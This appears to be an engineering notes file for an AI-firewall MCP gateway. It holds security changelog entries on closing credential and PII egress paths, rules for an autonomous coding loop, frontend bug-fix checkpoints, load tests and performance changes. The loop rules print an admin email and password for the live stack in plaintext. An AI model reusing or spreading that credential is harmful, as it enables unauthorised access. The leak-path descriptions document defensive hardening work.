    (mcp_proxy.py): added both methods to _EXT_FINITE_RESULT_METHODS -> buffered + scanned via the result floor
    (mask/block/render-leak/caps) on JSON + SSE branches; benign preserved. +3 tests. Gate: 3 + 55 ext-proxy + 1713
    gateway passed 0 failed; broker unaffected. Byte-level: completion.values [key AKIA****MPLE, contact
    b***@c***.example]; template desc AKIA****MPLE host [INTERNAL_IPV4_REDACTED]. Oracle (aidefence): has_pii true raw
    / false masked. Extends CHG-0077/0080. Evidence mcp-parallel/findings/backstop-p-ext-completion-templates-scan/.
  - CHG-0119 (2026-07-03) — MEDIUM 1.4 credential-egress: ext-proxy did not credential-scan completion/complete CLIENT
    INPUT before egress (input-side twin of CHG-0118). CHG-0118 scanned the completion RESULT, but its input was
    forwarded raw: the ext inbound credential-scan (_EXT_ARG_SCAN_METHODS = tools/call, prompts/get) only inspects
    params.arguments, and completion/complete's input has a DIFFERENT shape -> params.argument.value (user's partial
    typed value) + params.context.arguments -> never scanned. A credential in that input egressed to the untrusted
    external server. FIX (mcp_proxy.py): extract argument.value + context.arguments into a synthetic dict + run through
    _scan_tool_args_block (E12 credential force-block) BEFORE egress -> credential BLOCKED (never sent, client.send not
    awaited, audited credential_blocked_inbound); inbound redaction written back + audited; benign forwarded. Input +
    output of completion/complete now both scanned (parity with tools/call). +2 tests. Gate: 4 completion + 1720
    gateway passed 0 failed; broker unaffected. Byte-level: argument.value 'my key AKIAIOSFODNN7EXAMPLE' -> blocked,
    secret never reaches client.send. Oracle N/A (aidefence blind to AWS-key class; send-not-awaited authoritative).
    Extends CHG-0041/0109; input-side twin of CHG-0118. Evidence mcp-parallel/findings/backstop-p-ext-completion-input-scan/.
  - CHG-0120 (2026-07-03) — LOW tracing completeness: internal (chat-pipeline) routes dropped the X-Request-ID
    correlation id. CHG-0050/0051 propagate X-Request-ID into every MCPEvent + the broker adapter hop on org_mcp_jsonrpc
    + bare REST, but internal_tools_call + internal_discover_tools recorded ALL audit events with NO request_id and
    called _adapter_forward with NO correlation_id -> a chat-pipeline tool call / tool-sync trace ENDED at the internal
    boundary (CHG-0050 residual). FIX (mcp_proxy.py): both routes compute _mcp_request_correlation_id(request,1) once at
    entry + thread request_id into ALL _record_gateway_event calls (incl. the _scan_internal_result closure + the
    _scan_internal_tools_list helper, which gained a request_id param) + pass correlation_id to _adapter_forward (which
    propagates to the broker via broker_send_rpc CHG-0051 -> broker log CHG-0052). Trace now continuous gateway->broker->
    sandbox on the chat path. NEW TEST test_mcp_internal_correlation_id.py (3) + fixed a CHG-0109 test mock signature.
    Gate: 3 + 1756 gateway passed 0 failed; broker 155. Oracle N/A (tracing, no PII delta). Completes CHG-0050/0051/0052.
    Evidence mcp-parallel/findings/backstop-p-internal-correlation-id/.
  - CHG-0121 (2026-07-03) — LOW tracing completeness (LAST hop; closes the CHG-0052 residual): broker did not forward
    X-Request-ID to the sandbox AGENT + the agent didn't log it. CHG-0051/0052 propagate + log the correlation id at
    the broker, and CHG-0120 threads it gateway->adapter, but _post_agent_rpc was called with NO request_id + did
    client.post(json=payload) with NO headers -> the id never reached the in-container agent, whose /rpc neither read
    nor logged it. Trace broke at broker->agent. FIX: (1) services/mcp-broker/src/sandbox/routes.py: _forward_sandbox_rpc
    passes request_id to _post_agent_rpc, which forwards it as an X-Request-ID header (omitted when absent); (2)
    sandbox-image/agent/main.py: /rpc reads X-Request-ID (Header) + logs ONE line at entry with SAFE metadata ONLY
    (org/server/transport/method/jsonrpc_id/request_id, NEVER params/args/env/upstream, mirrors CHG-0052). Trace now
    continuous gateway->broker->sandbox agent. +2 broker tests + 1 agent test. Gate: 5 ready-retry + 157 broker + 7
    agent passed; gateway unaffected. Oracle N/A (tracing). Completes CHG-0050/0051/0052/0120. Item-13 tracing residual
    now only OTEL/Jaeger + PG/Redis backup (INFRA/host-blocked). Evidence mcp-parallel/findings/backstop-p-agent-correlation-id/.
  - CHG-0122 (2026-07-03) — MEDIUM 1.4 leak: finite SSE branch didn't scan interleaved server-pushed notifications. The
    ext-proxy FINITE SSE branch (tools/call/resources/*/prompts/*, buffered CHG-0039/0064) called
    _scan_reframe_sse_tool_result with the default scan_notifications=False -> a finite call's SSE can INTERLEAVE
    server-pushed notification frames (notifications/progress, notifications/message) BEFORE the result, and those were
    re-emitted VERBATIM (only result/error events scanned). A secret/PII in a mid-call notification egressed raw, while
    the NON-finite stream (CHG-0098) already scans notification params. Byte-verified: a notifications/message frame
    with AKIAIOSFODNN7EXAMPLE + bob@corp.example interleaved before a benign tools/call result egressed both raw. FIX
    (mcp_proxy.py): finite branch now passes scan_notifications=True -> interleaved notification params scanned
    (masked / fail-closed) via the result floor; result frame still delivered. +1 test. Gate: 12 sse + 1777 gateway
    passed 0 failed; broker unaffected. Byte-level: notification secret+email absent from re-emitted SSE. Oracle
    (aidefence): has_pii true raw / false masked. Parity with CHG-0098; extends CHG-0039/0064. Evidence mcp-parallel/
    findings/backstop-p-finite-sse-notification-scan/.

## Ralph autonomous loop — gateway hardening
- Backlog + status live in scripts/ralph/prd.json; learnings in scripts/ralph/progress.txt.
- ONE story per iteration; never break a passing gate; never mark passes:true without a green gate.
- Backend gate: `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests -q` (+ `./.venv/bin/python
  -m pytest tests/leakhunt` for leaks — build that suite under gateway/tests/leakhunt; +
  test_openai_sdk_compat.py for SDK). Frontend gate: `cd frontend && npm run lint && npm run build`
  plus dev-browser verification for UI stories.
- Security invariants are non-negotiable: egress bytes are the only source of truth; any redact/block
  verdict or assume_redacted attestation must be byte-verified; fail closed on a no-op scrub.
- Reuse responses_adapters.py error helpers; respect patterns.py false-positive protection; mirror the
  output-guard honesty check onto the input/egress path.
- UI-story gate (D*): the durable re-runnable gates are `scripts/playwright_*.mjs`. Run with
  `NODE_PATH="$PWD/tests/e2e/node_modules" BASE_URL=http://127.0.0.1:8180 node scripts/playwright_<story>.mjs`
  — playwright lives in `tests/e2e/node_modules`, NOT `frontend/`. They drive the LIVE docker stack
  (Vite :8180 → control :8100 → gateway :8300); login admin@zeroshield.io / Adm1n!Pass#2024 via the REAL
  form (localStorage-token injection alone does NOT establish a session — the AuthContext guard bounces to
  /login). Module-1.1 is telemetry-heavy: keep panel/login waits ≥60s so a slow-but-correct render is not a
  false failure; never lower an assertion to make a flaky gate pass.

<!-- mcp-page-ralph --> MCP-PAGE-CP01 | scripts/ralph/mcp_page_typesim.mjs (new) | WHAT: reusable type-sim Playwright harness (keyboard.type delay:40 / clear via Ctrl+A→Delete, NEVER fill; exports typeSim/login/openRegisterDialog) | WHY: comma-drop/focus-loss modal bug only reproduces under realistic keystrokes; fill() masks it | NOW DOES: CP01 smoke green (type 'a,b,c' into name → value correct, commas 2/2, focus held) | touched: none (new) | VERIFY: node scripts/ralph/mcp_page_typesim.mjs → ok:true

<!-- mcp-page-ralph --> MCP-PAGE-CP02 | scripts/ralph/mcp_page_cp02_args_repro.mjs (new) | WHAT: type-sim repro of Args comma-drop | WHY: CP02 prove bug | NOW DOES: REPRODUCED — type "a,b,c --flag,x" into Args → "abc--flagx", commas 0/3 + space dropped, focus KEPT (separator-drop, not remount); name/url/command unaffected → bug is specific to the comma-separated Args onChange (root-cause CP04) | touched: none (MCPConnectorPanel Args input suspect) | VERIFY: node scripts/ralph/mcp_page_cp02_args_repro.mjs → bugReproduced:true

<!-- mcp-page-ralph --> MCP-PAGE-CP03 | mcp_page_cp03_allfields_repro.mjs (new) + mcp_page_typesim.mjs (bounded click timeout) | WHAT: per-field type-sim record | WHY: CP03 record buggy fields | NOW DOES: args=SEP-DROP(0/3), env=SEP-DROP(0/1); name/url/description/command/bearer=clean; focus KEPT (not remount). Modal field map: Args ph "-y, @playwright/mcp@latest", Env ph "GITHUB_TOKEN=ghp_xxx", Command ph "npx". Two fields drop commas → common onChange (CP04 target) | touched: none (MCPConnectorPanel Args+Env onChange = CP05 fix) | VERIFY: node scripts/ralph/mcp_page_cp03_allfields_repro.mjs → buggyFields [args,env]

<!-- mcp-page-ralph --> MCP-PAGE-CP04 | frontend/src/components/MCPConnectorPanel.jsx (analysis) | WHAT: ROOT CAUSE = controlled-input-bound-to-parsed-collection, NOT a remount | Args (:1499-1500): value=args.join(", ") + onChange split(",").map(trim).filter(Boolean) → typing "," makes ["a",""]→filter→["a"]→re-render "a" (comma erased); trim kills spaces. Env (:1509-1520): same with object round-trip | FIX (CP05): store raw text in state, parse to array/object only on submit (payload @168-169) not per keystroke | VERIFY(after fix): cp03 args/env → clean

<!-- mcp-page-ralph --> MCP-PAGE-CP05 | frontend/src/components/MCPConnectorPanel.jsx | WHAT: FIX modal separator-drop — Args/Env inputs hold RAW TEXT (args_text/env_text), parsed to args[]/env_vars{} only at submit (buildServerPayload), never per keystroke; fallback to array/object for presets | WHY: CP04 array/object round-trip erased typed commas/spaces | NOW DOES: VERIFIED — CP03 buggyFields [], CP02 "a,b,c --flag,x" commas 3/3, vite build green (6.69s) | touched: MCPConnectorPanel.jsx (B1 logic intact) | VERIFY: cp03 [] + cp02 3/3 + npm run build

<!-- mcp-page-ralph --> MCP-PAGE-CP06 | mcp_page_cp06_verify.mjs (new) + mcp_page_typesim.mjs (opts.fast) | WHAT: comprehensive modal-typing verify — long comma strings into every field, values correct + focus kept, 4 viewports x 2 themes, 0 console errors | WHY: CP06 gate prove CP05 fix holds everywhere | NOW DOES: ALL 8 combos PASS (allPass:true). SECTION A (modal typing bug CP01-06) COMPLETE | touched: none new | VERIFY: node scripts/ralph/mcp_page_cp06_verify.mjs → 8/8 PASS

<!-- mcp-page-ralph --> MCP-PAGE-CP07 | frontend/src/components/MCPConnectorPanel.jsx (addServer refactor+cancelAdd+footer) + mcp_page_cp07_register_flow.mjs (new) | WHAT: Register attempts MCP connect+tool-discovery INLINE, modal stays OPEN during attempt (bug #2); create→sync inline→fail=inline error+stay open (Retry re-syncs same row)/success=close+list; Cancel deletes orphan row (never list 0 tools) | WHY: was POST then close immediately → 0-tools cards | NOW DOES: VERIFIED cp07Pass:true (example.com/mcp → stayedOpen:true, connecting+inline error), build green (6.30s) | FOLLOWUP: inline error leaks raw upstream (405 HTML) → sanitize in Section D CP16-19 | touched: MCPConnectorPanel.jsx (B1 intact) | VERIFY: node scripts/ralph/mcp_page_cp07_register_flow.mjs → cp07Pass:true

<!-- mcp-page-ralph --> MCP-PAGE-CP08 | frontend/src/components/MCPConnectorPanel.jsx (retry PATCHes row before re-sync) + mcp_page_cp08_retry.mjs (new) | WHAT: fail→clear inline error+modal open→fix+Retry PATCHes edited config then re-syncs, no dup create | WHY: CP07 retry did not apply form edits | NOW DOES: VERIFIED via network — register example.com→405 inline error, edit URL→Retry fires PATCH+tools sync (no 2nd create), Cancel fires DELETE (orphan cleanup); cp08Pass:true, build green | FOLLOWUP: sanitize raw upstream error (Section D CP16-19) | touched: MCPConnectorPanel.jsx | VERIFY: node scripts/ralph/mcp_page_cp08_retry.mjs → cp08Pass:true

<!-- mcp-page-ralph --> MCP-PAGE-CP09 | scripts/ralph/mcp_page_cp09_success.mjs (new verify; success branch already in CP07 addServer) | WHAT: verify register success — on tool discovery modal closes THEN server lists WITH tools (never 0) | HOW: Playwright route-mock sync(tools:3)+list(tools_count:3), decoupled from flaky shared sandbox | NOW DOES: cp09Pass:true (modalClosedOnToolDiscovery, listQueried, listedWithToolCount) | REAL-CONNECT NOTE: live Everything crashed exit -6 under parallel-loop sandbox stress (contention) — showed inline (validates CP07/08) + leaked internals (Section D target); real e2e = Section J | touched: none | VERIFY: node scripts/ralph/mcp_page_cp09_success.mjs → cp09Pass:true

<!-- mcp-page-ralph --> MCP-PAGE-CP10 | scripts/ralph/mcp_page_cp10_verify.mjs (new, verify-only) | WHAT: comprehensive register-flow verify (3 scenarios via route-mock): A error→modal open+inline error; B connected/0-tools→modal open+error, never lists 0-tools; C tools>0→modal closes+lists with tools | NOW DOES: cp10Pass:true, neverListedZeroTools:true. SECTION B (register flow CP07-10) COMPLETE — bug #2 resolved | touched: none (verifies CP07-09) | VERIFY: node scripts/ralph/mcp_page_cp10_verify.mjs → cp10Pass:true

<!-- mcp-page-ralph --> MCP-PAGE-CP11 (confirm) | WHAT: transport-routing current state | BACKEND: _is_sandbox_routed → stdio+ws always sandbox; http/sse sandbox when MCP_HTTP_VIA_SANDBOX on (running gateway=true, broker_send_rpc x4) → ALL 4 transports already route via per-org sandbox, gateway never dials upstream (P4.13/CHG-0026 done prior). CP12-14 already backend-complete | FRONTEND (CP15 gap): TRANSPORT_OPTIONS labels only stdio "Stdio (sandbox)" (:71); http/sse/ws no sandbox indicator; help text stdio-only → display WRONG | VERIFY: docker exec gateway env|grep MCP_HTTP_VIA_SANDBOX=true; grep _is_sandbox_routed mcp_proxy.py

<!-- mcp-page-ralph --> MCP-PAGE-CP12 (verify) | WHAT: http/sse execution IN per-org sandbox agent + egress allowlist | CHAIN: gateway _adapter_forward → broker_send_rpc {url,allowed_hosts,headers} → broker /v1/sandbox/{org}/rpc → sandbox agent _validate_upstream (:48) rejects non-allowlisted host -32002; gateway never dials upstream. LIVE (CP07): example.com/mcp http sync → "Upstream MCP error 405" = sandbox agent dialed it (proof via sandbox path). Prior egress-proof: gateway dials upstream 0x | VERIFY: grep broker_send_rpc+allowed_hosts in _adapter_forward; grep _validate_upstream upstream_manager.py

<!-- mcp-page-ralph --> MCP-PAGE-CP13 (verify) | WHAT: websocket execution IN sandbox agent (CHG-0026+iter39) | EVIDENCE: (1) gateway test_mcp_http_via_sandbox.py -k websocket → 2 passed (test_adapter_forward_websocket_uses_broker_send_rpc: ws routes via broker_send_rpc not in-gateway ws adapter); (2) sandbox agent upstream_manager ws_manager send_ws_jsonrpc(:434)/close_ws(:161), _AUTO_INIT includes websocket(:396); (3) control models url=CharField → ws:// accepted (iter39) | LIMITATION: no live ws server → unit+code verified | VERIFY: pytest ...-k websocket (2 passed)

<!-- mcp-page-ralph --> MCP-PAGE-CP14 (verify) | WHAT: LIVE-proved gateway opens NO direct upstream connection (talks only to sandbox) | METHOD: register streamable-http example.com/mcp, fire syncs, sample gateway vs sandbox /proc/net/tcp+tcp6 ∩ example.com IPs | RESULT: GATEWAY dialed example.com=FALSE, SANDBOX=TRUE {104.20.23.154} → isolation holds. CODE: _is_sandbox_routed True all 4 transports→broker_send_rpc, direct-httpx fallback dead when flag on. Corroborates p4-13/EGRESS_HTTP_PROVEN | GOTCHA: fresh login (cached tok→401) + parse tcp6 (example.com IPv6-first) | VERIFY: CP14 snippet → gateway NOT, sandbox YES

<!-- mcp-page-ralph --> MCP-PAGE-CP15 | frontend/src/components/MCPConnectorPanel.jsx | WHAT: frontend shows Sandboxed for ALL transports (bug #3): stdio label "Stdio (sandbox)"→"Stdio"; help text → all 4 transports run in per-org sandbox + Shield "Sandboxed" badge for every transport; server cards get a Shield Sandboxed badge next to transport | WHY: backend sandboxes all transports (CP12/13/14) but UI implied stdio-only | NOW DOES: VERIFIED per transport — Sandboxed badge visible for streamable-http/sse/websocket/stdio; build green (6.09s). SECTION C complete | touched: MCPConnectorPanel.jsx | VERIFY: cycle Transport → Sandboxed badge all 4

<!-- mcp-page-ralph --> MCP-PAGE-CP47 (load driver) | scripts/ralph/mcp_page_cp47_stress.py | WHAT: multiprocess×async CLOSED-LOOP MCP tool-call load driver across many orgs×sandboxes (extends P9 mcp_concurrency_live.py/mcp_load_live.py). WORKERS procs × CONN async conns pull from a per-proc quota with NO per-round barrier → true sustained RPS. Wire: POST {GATEWAY}/gateway/{org}/mcp/{server} + Bearer key; echo(nonce)+get-sum(a,b) deterministic oracles + HARD cross-tenant CANARY per org. Metrics: rps, p50/p90/p99 latency, status hist, drop vs backpressure. Env TARGET_CALLS/DURATION_S/WORKERS/CONN/MAX_FAIL_RATE; run with gateway/.venv/bin/python. | GOTCHA: on this shared VM the 15-MCP fleet saturates ~45 RPS at 32 in-flight (Little's Law: throughput≈concurrency/latency); more in-flight → queue latency, not RPS. Literal 100k RPS not physically attainable here — measure the real ceiling honestly. | VERIFY: 300c/8if→33.5rps, 2000c/32if→45.5rps, 0 drop, isolation clean, canary_leak=0.

<!-- mcp-page-ralph --> MCP-PAGE-CP48 (saturation) | scripts/ralph/mcp_page_cp48_saturation.py | WHAT: saturation sweep localizes the MCP tool-call throughput bottleneck. FINDING: fleet (5 servers) pins ~47 RPS from 32 in-flight (latency linear, 0 drops/503/OOM even @128 in-flight — graceful). NOT resource-bound (peak gateway CPU 0.45%, sandboxes 0.08%). A SINGLE server scales 13→45 RPS (1→16 in-flight) ≈ whole fleet → the ~47 RPS is a SHARED AGGREGATE chokepoint (~21ms serial), NOT per-server serialization. Cross-tenant canary_leak=0 under mixed 3-org load. | GOTCHA: to distinguish per-server vs aggregate limits, sweep in-flight to ONE server (SERVER_FILTER) — if it scales, the bottleneck is shared/upstream (gateway worker count / per-call sync round-trip to control/DB), not the MCP server. | VERIFY: cp48/verdict.json diagnosis=NOT-per-server.

<!-- mcp-page-ralph --> MCP-PAGE-CP49 (audit hot-path decouple) | gateway/ai_mesh_gateway/mcp_proxy.py | WHAT: the ~47 RPS tool-call ceiling (CP48) was a per-call SYNC audit POST awaited INLINE to single-thread daphne (`_record_gateway_event` opened a FRESH httpx client per call). FIX: `_spawn_audit_event` fires it off the hot path via a process-local POOLED client + bounded fire-and-forget (`GATEWAY_AUDIT_MAX_INFLIGHT`=64, drop-under-backpressure). Enforcement decision stays inline; only the best-effort audit record is decoupled. | GOTCHA: do NOT "fix" this by flipping `GATEWAY_ASYNC_MCP_AUDIT=true` — the Redis-drain task `record_mcp_event_task` does a bare MCPEvent.create WITHOUT the EnforcementEvent bridge/write_risk, so it would silently regress the 1.4 threat-feed telemetry (CP31/32). Keeping the SAME POST to `/internal/record-event/` (just off the hot path) preserves `_record_event`'s full persistence. | VERIFY: gateway suite 1245 passed; post-fix single conn=1 13→21 RPS (+56%), p50 74→45ms; 0 drops/canary=0 across full back-to-back sweep. Remaining ~48/sandbox ceiling is architectural (per-org gVisor stdio, idle CPU) — scale horizontally, not a config knob.

<!-- mcp-page-ralph --> MCP-PAGE-CP50 (final stress+verify) | scripts/ralph/mcp_page_cp50_final_verify.py | WHAT: completion gate — CP47 driver 3× consecutive vs full 15-MCP fleet (3 orgs×5 servers, 48 in-flight, 3000/run), each gated on 0 drops + 0 5xx + concurrency-correct (id/content/arith) + cross-tenant clean (cross_tenant + canary_leak). RESULT: GREEN 3×/3% — 9000 calls, 0 drops, isolation perfect every run, rps≈48.7. | GOTCHA: run the 3× on a SETTLED system — a fresh run fired atop a prior sweep's sandbox backlog transiently sheds connections (recoverable; isolation stays perfect). Driver models a real client (retries transient conn errors on idempotent echo/get-sum; recoveries counted). 100k RPS is physically unattainable on 1 shared VM (per-sandbox gVisor stdio ~48 RPS, idle CPU) — scale horizontally. | VERIFY: cp50/final_verify.json all_green_3x=true.

## Shared Infra Changes

Dynamic full-hardware concurrency lane (perf). Mirrored in `docs/perf/CHANGELOG.md`,
`.cursor/rules/shared-infra-changelog.mdc`, Ruflo `shared/infra-changes`. Newest first.

<!-- perf-ralph --> PERF-0013 (2026-07-03) [RUNNING STACK] | module-kpis (dashboard "PROTECTED SUBMODULES") type-safe metadata extraction + deploy. The live overview dashboard showed "-- / 7 Awaiting data" because ModuleKpisView was the last full-metadata-haul endpoint (it passes the whole dict to the firewall-module classifier). Fixed with `KeyTransform` (`metadata->'key'`, PRESERVES native JSON types — the classifier reads bools is_audit_log/is_isolation_event + number security_risk_score, so KeyTextTransform would corrupt truthiness): extract the bounded 10-key set (`_MODULE_META_FIELDS`), reconstruct a partial meta dict identical for the classifier. Control rebuilt + control-1 recreated (healthy 2s, 16 workers) to DEPLOY. | AFFECTS: control image + RUNNING control-1. | ACTION FOR OTHERS: none (live); `docker compose build control` to adopt image. | PROOF: classifier+risk 0 mismatches/237860 rows; module-kpis 5.64s→2.56s (fetch 4.1x); dashboard now shows "PROTECTED SUBMODULES 7/7 — All firewall lanes online" (was "Awaiting data"), status Connected, hero KPIs live, audit GATE PASSED, 0 JS errors.
<!-- perf-ralph --> PERF-0012 (2026-07-03) [RUNNING STACK] | Shared control-1 RECREATED to the multi-worker image (was wedged). The live control-1 had been WEDGED/unhealthy ~46 min (single-Daphne event loop stuck: failing streak 277, CPU 0.19% idle, /api/health/ timing out — the exact single-event-loop failure this lane fixes). Recreated via `docker compose up -d --no-deps --force-recreate control` → gunicorn + 16 UvicornWorker (detector on the 16-core host), HEALTHY in 2s, 1.95GiB RAM (efficient CoW), CPU idle. | AFFECTS: the RUNNING shared control plane — deploys to the live stack ALL control perf work (PERF-0002 multi-worker, 0004 asgi-threads, 0007 redis-pool, 0008 BRIN, 0009/0010/0011 soc-kpis/hot-endpoint fixes). Control now uses all cores under load + is resilient (a wedged worker can't down the service) vs the prior single-core oscillation. | ACTION FOR OTHERS: none — control-1 is healthy + faster; runs 16 workers (~2GiB), set `CONTROL_WEB_CONCURRENCY` for fewer. Resolves "control-1 oscillates unhealthy under load". | PROOF: health 200 streak 0, --workers 16, mem 1.95GiB; was streak 277 wedged.
<!-- perf-ralph --> PERF-0011 (2026-07-03) | Apply the metadata-extraction fix to 3 more full-haul endpoints. Item 21. Surveyed every `.values(...,"metadata")` full-window haul in security_views/analytics_views/dashboard_views. 3 more used ONLY bounded scalars → now extract in SQL via KeyTextTransform (module-level import added): UserSecurityKpis(high_risk_users, 30-90d) + agent-risk-breakdown = only security_risk_score; RagPipelineStages = event_type/pipeline_stage/latency_ms. The other ~10 full-haul views pass the WHOLE metadata dict to classifiers/taggers/serializers (specialty_modules_for_event, _tag_event, _violation_tag_event, metadata_rule_names, _get_owasp_codes, _sanitized_meta_for_client, nested extra) → genuinely need the JSON (NOT fixable via extraction; they still get PERF-0010's direct-FK org filter). `[:50]`/`[:scan_cap]` views already row-bounded. | AFFECTS: control image (behavior identical, faster). | ACTION FOR OTHERS: `docker compose build control`; identical output, no restart. | PROOF: all 3 verified IDENTICAL:True (high_risk_users/by_type/stages) old-vs-new on live data; 30d-window fetch 13.24s→0.67s (19.7×); manage.py check clean.
<!-- perf-ralph --> PERF-0010 (2026-07-03) | soc-kpis: direct-FK org filter (drop legacy OR-with-joins). Item 20. `_enforcement_events_for_request` (shared by ~31 SOC views) simplified from `Q(organization=org) | (organization IS NULL & endpoint/agent/policy joins)` + a separate `Endpoint.objects.filter()` subquery → `base_queryset.filter(organization=org)`. Safe: the telemetry drain + eval path set organization_id on every event (verified 0/288k rows NULL-org); row sets verified identical (org=2: 109417==109417). | AFFECTS: control image — ALL ~31 SOC views get it (identical output, fewer queries/joins). | ACTION FOR OTHERS: `docker compose build control`; identical output, no restart; if a NULL-org event is ever introduced backfill its organization_id. | PROOF: full org-scoped soc-kpis compute (direct-FK + PERF-0009 extraction + loop) = 0.768s for org2's 109k rows → <1s (from 24-30s). soc-kpis end-to-end 24-30s→<1s via PERF-0008(BRIN)+0009(JSON)+0010(FK).
<!-- perf-ralph --> PERF-0009 (2026-07-03) | soc-kpis: stop hauling metadata JSON. Item 19. SocKpisView (`policy/security_views.py`) replaced `list(events.values("action","metadata"))` (hauled the whole ~1.6KB metadata JSONB/row → 288k dicts decoded in Python) with SQL `KeyTextTransform` extraction of ONLY the 3 fields the metrics use (security_risk_score/latency_ms/request_id); the per-row loop is unchanged. Metadata types uniform (risk/latency=number, request_id=string) so text extraction is faithful. | AFFECTS: `ai_mesh_firewall-control` image (behavior IDENTICAL, just faster). | ACTION FOR OTHERS: `docker compose build control`; output byte-identical, no restart. | PROOF: live 288k-row/24h window full view compute 14.67s→0.98s (14.9×); METRICS IDENTICAL across every field; per-row extraction 0 mismatches/288216; `manage.py check` clean. Pairs w/ BRIN (PERF-0008); item 20 (org filter) next toward <1s.
<!-- perf-ralph --> PERF-0008 (2026-07-03) [DB SCHEMA] | soc-kpis BRIN index on EnforcementEvent.created_at. Item 18. Migration `policy/0036_ev_created_at_brin` adds a standalone BRIN index on `created_at` — the only prior created_at index was the composite `(organization,event_class,created_at DESC)` whose leading col is organization (useless for a created_at-only window). Applied CONCURRENTLY (AddIndexConcurrently+atomic=False, NO table lock on the 288k-row/472MB table) — **already live on the shared DB**. Backward-compatible (old code works, just faster). | AFFECTS: shared Postgres schema. | ACTION FOR OTHERS: `docker compose build control` at convenience to get the migration file; `manage.py migrate` then no-ops (0036 already applied); no restart. | PROOF: index=40kB; selective 10-min window → Bitmap Index Scan on ev_created_at_brin (block-range pruning), 0.3ms. NB dominant soc-kpis 24-30s cost is hauling 288k×~1.6KB metadata JSON into Python (items 19-20); this is the window-seek half.
<!-- perf-ralph --> PERF-0007 (2026-07-03) | Redis/cache pools sized from the detector. Item 16. Detector gains `redis_pool=clamp(asgi_threads*4,64,256)` (6c=64,12c=96,16c=128, additive). `gateway/entrypoint.sh` exports `GATEWAY_REDIS_MAX_CONNECTIONS` (middleware rate-limit pool, was fixed 300); `control/server-entrypoint.sh` exports `DJANGO_CACHE_MAX_CONNECTIONS` (Django cache, was fixed 200). Generous per-worker lazy ceilings, scale with cores, never bottleneck (Redis live 49/10000). Gateway HOT-PATH REDIS_CLIENT left unbounded (safe — capping risks errors). Vault pool done in PERF-0005. Explicit env overrides. | AFFECTS: gateway+control images (rebuilt); resource_budget.py additive. | ACTION: `docker compose build gateway control`; running containers not recreated. | PROOF: --cpus=6 PID1 env GATEWAY_REDIS_MAX_CONNECTIONS=64 + DJANGO_CACHE_MAX_CONNECTIONS=64; control /api/health/ 200; 20 detector tests green.
<!-- perf-ralph --> PERF-0006 (2026-07-03) | Postgres max_connections budget — 400 CONFIRMED SUFFICIENT, NO restart. Item 15. MEASURED control ~2.5 DB conns/worker (Django sync views serialize on the thread-sensitive executor, not the detector's asgi_threads worst-case). `scripts/perf/pg_budget.py` derives the stack recommendation from the detector: 6c→107, 12c→185, 16c→257 — all < the deployed 400 (live usage 16/400). CONN_MAX_AGE=60 (env POSTGRES_CONN_MAX_AGE) sane. | AFFECTS: nothing running — analysis + helper only, NO docker-compose/Postgres change, NO restart. Worker-count changes PERF-0001/0002 do NOT risk PG exhaustion on target profiles. | ACTION FOR OTHERS: none — 400 covers ≤~24c. For a bigger box set POSTGRES_MAX_CONNECTIONS from pg_budget.py before `docker compose up` (restarts PG) or add pgbouncer. Don't raise speculatively (~10MB RAM/conn).
<!-- perf-ralph --> PERF-0005 (2026-07-03) | Gateway scanner/bedrock/vault pools sized from the detector: `shared/.../resource_budget.py` gains `scanner_pool`=clamp(round(cpu),4,16), `bedrock_pool`=asgi_threads, `vault_pool`=clamp(round(cpu/2),2,8) (additive fields+CLI); `gateway/entrypoint.sh` exports `GATEWAY_SCANNER_THREAD_POOL_SIZE`/`GATEWAY_SCAN_THREAD_POOL_SIZE`=scanner, `GATEWAY_BEDROCK_THREAD_POOL_SIZE`=bedrock, `GATEWAY_VAULT_POOL_MAX`=vault (were fixed 8/4/16/8). Clamped because each ×workers (item 11); vault=Postgres conn pool feeds pg sizing (item 15). Explicit env overrides. | AFFECTS: gateway image (rebuilt); resource_budget.py additive (control/workers unaffected). | ACTION: `docker compose build gateway`; running container not recreated. | PROOF: --cpus=6 PID1 env scanner/scan=6 bedrock=12 vault=3; InputScanner logs thread_pool_size=6; override→3 honored; 19 detector tests green.
<!-- perf-ralph --> PERF-0004 (2026-07-03) | Control ASGI sync-offload thread pool sized from the detector: `control/main_app/asgi.py` sets the event-loop default ThreadPoolExecutor per worker from `ASGI_THREADS` (entrypoint exports it from the detector: `clamp(cpu*2,8,32)` → 6c=12, 12c=24), replacing Python's non-cgroup-aware `min(32, os.cpu_count()+4)` (host-16 → 20 threads even in a 6c container). Thread-SENSITIVE Django views/ORM untouched (asgiref single-thread; that's P4). `ASGI_THREADS` env overrides. | AFFECTS: control image (rebuilt). | ACTION: `docker compose build control`; running container not recreated. | PROOF: --cpus=6 → each worker logs "ASGI default thread-pool executor sized to 12"; /api/health/ 200.
<!-- perf-ralph --> PERF-0003 (2026-07-03) | Harden gateway+control entrypoints: `export WEB_CONCURRENCY="$WORKERS"` before exec'ing gunicorn — gunicorn reads WEB_CONCURRENCY at config-import time and crashes on an empty string (`int('')` ValueError) before `--workers` is parsed. Found proving item 08. | AFFECTS: gateway+control images (rebuilt). | ACTION: `docker compose build gateway control`; no behavior change for valid configs, prevents a boot crash when `WEB_CONCURRENCY=` empty; running containers not recreated.
<!-- perf-ralph --> PERF-0002 (2026-07-03) | Control plane: single Daphne → gunicorn + N `uvicorn.workers.UvicornWorker` (`--workers N` from the detector, `--forwarded-allow-ips *`) via new `control/server-entrypoint.sh`; replaces single Daphne (dev) / hardcoded `--workers 5` (prod). `CONTROL_WEB_CONCURRENCY` env overrides; fallback 2. Multiproc-safe: telemetry drain is per-hostname single-runner-locked (atomic Lua dequeue + SET NX), resync/seed idempotent. Boot-verified: 4 workers serve `/api/health/` 200. | AFFECTS: `ai_mesh_firewall-control` image (rebuilt). | ACTION FOR OTHERS: `docker compose build control` to adopt; running container NOT recreated (shared host still single Daphne, unchanged). ⚠️ Before recreating on the 16-core host PIN `CONTROL_WEB_CONCURRENCY` (e.g. 6) in `.env` — unpinned = 16 workers, can pressure Postgres `max_connections=400` (sized in a later item). Recreate: `docker compose up -d --force-recreate control`. | PROOF: in-container detector → `--cpus=6`→6w, `--cpus=12`→12w, `CONTROL_WEB_CONCURRENCY=3`→3w; live boot 4w/health-200.
